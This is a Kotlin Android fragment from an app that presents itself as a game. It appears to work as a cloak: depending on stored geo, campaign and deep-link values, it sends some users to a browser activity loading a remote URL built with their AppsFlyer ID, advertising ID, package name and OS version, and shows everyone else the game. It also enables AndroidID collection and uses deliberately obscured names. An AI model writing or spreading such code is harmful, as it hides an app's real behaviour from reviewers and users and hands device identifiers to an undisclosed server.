package com.fuzzyhouse.wonderwoollie


import com.fuzzyhouse.wonderwoollie.entity.Util.myId
import com.fuzzyhouse.wonderwoollie.entity.Util.namm
import com.fuzzyhouse.wonderwoollie.entity.Util.one
import com.fuzzyhouse.wonderwoollie.entity.Util.subFive
import com.fuzzyhouse.wonderwoollie.entity.Util.subFour
import com.fuzzyhouse.wonderwoollie.entity.Util.subOne
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.appsflyer.AppsFlyerLib
import com.fuzzyhouse.wonderwoollie.entity.Util.PAAACK
import com.fuzzyhouse.wonderwoollie.entity.Util.ad_id
import com.fuzzyhouse.wonderwoollie.entity.Util.apps
import com.fuzzyhouse.wonderwoollie.entity.Util.aps_id
import com.fuzzyhouse.wonderwoollie.entity.Util.codeCode
import com.fuzzyhouse.wonderwoollie.entity.Util.geoCo
import com.fuzzyhouse.wonderwoollie.entity.Util.instId
import com.fuzzyhouse.wonderwoollie.entity.Util.keyVAl
import com.fuzzyhouse.wonderwoollie.entity.Util.linkaa
import com.fuzzyhouse.wonderwoollie.entity.Util.subSix
import com.fuzzyhouse.wonderwoollie.entity.Util.trololo
import com.fuzzyhouse.wonderwoollie.entity.Util.urlMain
import com.fuzzyhouse.wonderwoollie.gaameact.GaaammmyActivity2
import com.fuzzyhouse.wonderwoollie.presenation.BrooooovvvssActivity
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class FilllaFragment : Fragment() {

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_fillla, container, false)
    }

    private lateinit var mContext: Context
    val shareP: SharedPreferences by inject(named("SharedPreferences"))

    override fun onAttach(context: Context) {
        super.onAttach(context)
        mContext = context
    }


    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val counthy = shareP.getString(geoCo, null)
        val appCamphyyh = shareP.getString("appCamp", null)
        val deepSthyhy = shareP.getString("deepSt", null)
        val countryDevhyhy = shareP.getString(codeCode, null)
        val appsgtgt = shareP.getString(apps, null)
        val wvhyhy = shareP.getString(urlMain, null)
        val mainIdgtgt = shareP.getString("mainId", null)
        val pack66 = PAAACK
        val buildVershyhy = Build.VERSION.RELEASE
        val myTrIdgtgt = shareP.getString(myId, null)
        val myInstIdgt: String? = shareP.getString(instId, null)

        val intentBeamgtg = Intent(activity, BrooooovvvssActivity::class.java)
        val intentGamegttg = Intent(activity, GaaammmyActivity2::class.java)

        val gtgtgtId = AppsFlyerLib.getInstance().getAppsFlyerUID(mContext)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        shareP.edit().putString(aps_id, gtgtgtId).apply()

        Log.d("lolo", "apps ${appsgtgt}")
        Log.d("lolo", "count ${counthy}")
        Log.d("lolo", "countryDev ${countryDevhyhy}")
        Log.d("lolo", "countryDev ${countryDevhyhy}")

        val lingtgtgtkApps = "$wvhyhy$subOne$appCamphyyh&$one$gtgtgtId&$ad_id$mainIdgtgt&$subFour$pack66&$subFive$buildVershyhy&$subSix$namm"
        val linkMTgtgt = "$wvhyhy$one$myTrIdgtgt&$ad_id$myInstIdgt&$subFour$pack66&$subFive$buildVershyhy&$subSix$namm"
        val linkFBgttg = "$wvhyhy$subOne$deepSthyhy&$one$gtgtgtId&$ad_id$mainIdgtgt&$subFour$pack66&$subFive$buildVershyhy&$subSix$trololo"
        val linkFBNullAppsgttg = "$wvhyhy$subOne$deepSthyhy&$one$myTrIdgtgt&$ad_id$myInstIdgt&$subFour$pack66&$subFive$buildVershyhy&$subSix$trololo"

        when(appsgtgt) {
            "1" ->
                if(appCamphyyh!!.contains(keyVAl)) {
                    shareP.edit().putString(linkaa, lingtgtgtkApps).apply()
                    shareP.edit().putString("WebInt", "campaign").apply()
                    startActivity(intentBeamgtg)
                    activity?.finish()
                } else if (deepSthyhy!=null||countryDevhyhy!!.contains(counthy.toString())) {
                    shareP.edit().putString(linkaa, linkFBgttg).apply()
                    shareP.edit().putString("WebInt", "deepLink").apply()
                    startActivity(intentBeamgtg)
                    activity?.finish()
                } else {
                    startActivity(intentGamegttg)
                    activity?.finish()
                }
            "0" ->
                if(deepSthyhy!=null) {
                    shareP.edit().putString(linkaa, linkFBNullAppsgttg).apply()
                    shareP.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(intentBeamgtg)
                    activity?.finish()
                } else if (countryDevhyhy!!.contains(counthy.toString())) {
                    shareP.edit().putString(linkaa, linkMTgtgt).apply()
                    shareP.edit().putString("WebInt", "geo").apply()
                    startActivity(intentBeamgtg)
                    activity?.finish()
                } else {
                    startActivity(intentGamegttg)
                    activity?.finish()
                }
        }
    }
}